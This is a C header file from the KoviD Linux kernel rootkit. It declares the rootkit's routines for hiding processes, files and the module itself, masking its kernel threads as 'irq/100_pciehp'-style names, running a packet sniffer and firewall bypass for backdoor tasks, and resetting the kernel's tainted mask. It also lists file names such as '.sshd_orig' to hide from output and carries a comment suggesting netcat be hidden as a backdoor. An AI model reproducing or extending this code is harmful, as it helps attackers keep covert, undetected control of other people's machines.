/**
 * Linux Kernel version <= 5.5.0
 * - hash
 *
 *  KoviD rootkit
 */

#ifndef __KERNEL_ADDR_H
#define __KERNEL_ADDR_H

#ifdef DEBUG_RING_BUFFER
#pragma message "!!! Be careful: Build kovid in DEBUG mode !!!"
#define prinfo(fmt, ...) pr_info(fmt, ##__VA_ARGS__);
#define prwarn(fmt, ...) pr_warn(fmt, ##__VA_ARGS__);
#define prerr(fmt, ...)  pr_err(fmt, ##__VA_ARGS__);
#define premerg(fmt, ...)  pr_emerg(fmt, ##__VA_ARGS__);
#define pralert(fmt, ...)  pr_alert(fmt, ##__VA_ARGS__);
#define prcrit(fmt, ...)  prcrit(fmt, ##__VA_ARGS__);
#define prnotice(fmt, ...)  prnotice(fmt, ##__VA_ARGS__);
#define prinfo_ratelimited(fmt, ...) pr_info_ratelimited(fmt, ##__VA_ARGS__);
#define prwarn_ratelimited(fmt, ...) pr_warn_ratelimited(fmt, ##__VA_ARGS__);
#define prerr_ratelimited(fmt, ...) pr_err_ratelimited(fmt, ##__VA_ARGS__);
#define prinfo_once(fmt, ...) pr_info_once(fmt, ##__VA_ARGS__);
#define prwarn_once(fmt, ...) pr_warn_once(fmt, ##__VA_ARGS__);
#define prerr_once(fmt, ...) pr_err_once(fmt, ##__VA_ARGS__);

#else
#define prinfo(fmt, ...) do {} while (0)
#define prwarn(fmt, ...) do {} while (0)
#define premerg(fmt, ...) do {} while (0)
#define pralert(fmt, ...) do {} while (0)
#define prcrit(fmt, ...) do {} while (0)
#define prnotice(fmt, ...) do {} while (0)
#define prerr(fmt, ...) do {} while (0)
#define prwarn_ratelimited(fmt, ...) do {} while (0)
#define prinfo_ratelimited(fmt, ...) do {} while (0)
#define prerr_ratelimited(fmt, ...) do {} while (0)
#define prinfo_once(fmt, ...) do {} while (0)
#define prwarn_once(fmt, ...) do {} while (0)
#define prerr_once(fmt, ...) do {} while (0)
#endif

#define EXIT_UNHIDE 1
#define OBFLEN(x) (sizeof(x)/sizeof(char*))
#define OBFLEN2(x) sizeof(x)

#define THREAD_PROC_NAME "irq/100_pciehp"
#define THREAD_SOCK_NAME "irq/101_pciehp"
#define THREAD_SNIFFER_NAME "irq/102_pciehp"
#define THREAD_TAINTED_NAME "irq/103_pciehp"

typedef enum {
    CHILDREN,
    NO_CHILDREN,
    WHATEVER
}Operation;

struct hidden_tasks {
    struct task_struct *task;

    /** FS associated with task
     * NULL if kernel thread
     */
    struct fs_file_node *fnode;

    /**
     * backdoor tasks cannot
     * be left hanging around
     */
    int select;

    struct list_head list;
    pid_t group;

    /**
     * It is backdoor task
     * if source address != 0
     */
    __be32 saddr;
};

struct hidden_status {
    __be32 saddr;
    bool hidden;
};

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type, struct pid *);
#else
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type);
#endif


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
typedef struct bpf_map *(*bpf_map_get_sg)(unsigned int);
#else
typedef struct bpf_map *(*bpf_map_get_sg)(struct fd);
#endif

typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
typedef void (*do_exit_sg)(long error_code) __noreturn;
#endif

typedef asmlinkage long (*sys64)(struct pt_regs *regs);

typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);


struct kernel_syscalls {
    attach_pid_sg k_attach_pid;
    bpf_map_get_sg k_bpf_map_get;
    kallsyms_lookup_name_sg k_kallsyms_lookup_name;
    sys64 k_sys_setreuid;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    do_exit_sg k_do_exit;
#endif
    do__set_task_comm_sg k__set_task_comm;
    unsigned long *tainted;
};

/** hooks, hiding presence and so */
bool sys_init(void);
void sys_deinit(void);
char *sys_ttyfile(void);
char *sys_sslfile(void);

/** pid,task management */
bool kv_pid_init(struct kernel_syscalls *fn_addr);
bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
bool kv_find_hidden_task(struct task_struct *);
void kv_hide_task_by_pid(pid_t, __be32, Operation);
void kv_unhide_task_by_pid_exit_group(pid_t pid);
bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct*, void *), void *);
bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
void kv_reload_hidden_task(struct task_struct *task);
void kv_pid_cleanup(void);
void kv_rename_task(pid_t, const char *);
void kv_show_saved_tasks(void);
void kv_show_all_tasks(void);
void kv_scan_and_hide(void);

/** syscall,function addresses */
struct kernel_syscalls *kv_kall_load_addr(void);

/** resets tainted_mask */
void kv_reset_tainted(unsigned long *);

/** socket,networking,backdoor management */
struct task_struct *kv_sock_start_sniff(void);
bool kv_sock_start_fw_bypass(void);
void kv_sock_stop_sniff(struct task_struct *tsk);
void kv_sock_stop_fw_bypass(void);
bool kv_bd_search_iph_source(__be32 saddr);
bool kv_check_cursing(struct tcphdr *);
void kv_bd_cleanup_item(__be32 *);

/** proc handling */
int kv_add_proc_interface(void);
void kv_remove_proc_interface(void);
int kv_is_proc_interface_loaded(void);

/** whatever */
char *kv_util_random_AZ_string(size_t);
int kv_run_system_command(char **);

/** VM operations */
unsigned long kv_get_elf_vm_start(pid_t);

/*
 * Hide these names from write() fs output
 */
static const char *kv_hide_str_on_load[] = {
    ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
    UUIDGEN ".sh", ".sshd_orig", NULL
};

enum {
    KV_TASK,
    /* The following indicates a backdoor
     * task that can also hide its
     * tcp traffic
     */
    KV_TASK_BD
};

struct _kv_hide_ps_on_load {
    const char *name;
    int type;
} ;

 /*
  * Hide these process names at insmod
 */
static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
    {"whitenose-example", KV_TASK},
    {"pinknose-example", KV_TASK},
    {"rednose-example", KV_TASK},
    {"blacknose-example", KV_TASK},
    {"greynose-example", KV_TASK},
    {"purplenose-example", KV_TASK},

    // Uncomment, recompile and try nc:
    //{"nc", KV_TASK_BD},

    {NULL, -1},
};

/*
 * Helper that returns the list of names to hide on load
 */
static inline const char **kv_get_hide_ps_names(void) {
    // XXX: using fixed maxsize kv_hide_ps_on_load for now
    static const char *names[32];
    if (!*names) {
        int i = 0;
        size_t maxnames = sizeof(names) / sizeof(*names);
        for (; i < maxnames && kv_hide_ps_on_load[i].name != NULL; ++i) {
            names[i] = kv_hide_ps_on_load[i].name;
        }
    }
    return names;
}


// PP_NARG from
// https://groups.google.com/forum/#!topic/comp.std.c/d-6Mj5Lko_s
#define PP_NARG(...) \
    PP_NARG_(__VA_ARGS__,PP_RSEQ_N())
#define PP_NARG_(...) \
    PP_ARG_N(__VA_ARGS__)
#define PP_ARG_N( \
          _1, _2, _3, _4, _5, _6, _7, _8, _9,_10, \
         _11,_12,_13,_14,_15,_16,_17,_18,_19,_20, \
         _21,_22,_23,_24,_25,_26,_27,_28,_29,_30, \
         _31,_32,_33,_34,_35,_36,_37,_38,_39,_40, \
         _41,_42,_43,_44,_45,_46,_47,_48,_49,_50, \
         _51,_52,_53,_54,_55,_56,_57,_58,_59,_60, \
         _61,_62,_63,N,...) N
#define PP_RSEQ_N() \
         63,62,61,60,                   \
         59,58,57,56,55,54,53,52,51,50, \
         49,48,47,46,45,44,43,42,41,40, \
         39,38,37,36,35,34,33,32,31,30, \
         29,28,27,26,25,24,23,22,21,20, \
         19,18,17,16,15,14,13,12,11,10, \
         9,8,7,6,5,4,3,2,1,0

static inline void _kfree(void **p) {
    if (*p != NULL) {
        kfree(*p);
        *p = NULL;
    }
}

static void __attribute__((unused))mem_free(int argc, ...) {
    va_list ap;
    int i;
    va_start(ap, argc);
    for (i = 0; i < argc; ++i)
        _kfree(va_arg(ap, void**));
    va_end(ap);
}
#define kv_mem_free(...) mem_free(PP_NARG(__VA_ARGS__), __VA_ARGS__)

#endif
